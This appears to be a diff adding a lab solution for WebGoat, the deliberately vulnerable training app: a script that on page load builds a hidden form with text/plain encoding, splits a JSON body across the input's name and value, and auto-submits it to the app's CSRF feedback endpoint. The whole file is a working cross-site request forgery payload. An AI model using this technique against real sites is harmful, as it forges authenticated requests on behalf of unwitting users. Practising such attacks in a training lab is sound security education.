@@ -1,0 +1,28 @@
+<script>
+    window. addEventListener('load', () => {
+        const json = {
+            "name": "WebGoat",
+            "email": "webgoat@webgoat.org",
+            "content": "WebGoat is the best!!"
+        };
+
+        const url = 'http://localhost:8080/WebGoat/csrf/feedback/message';
+
+        const form = document.createElement('form');
+        form.action = url;
+        form.enctype = "text/plain";
+        form.method = "POST";
+
+        const input = document.createElement('input');
+        const string = JSON.stringify(json);
+
+        input.name = string.substring(0, string.length - 2);
+        input.type ='hidden';
+        input.value = '"}';
+        form.appendChild(input);
+
+        document.body.appendChild(form);
+
+        form.submit();
+    });
+</script>
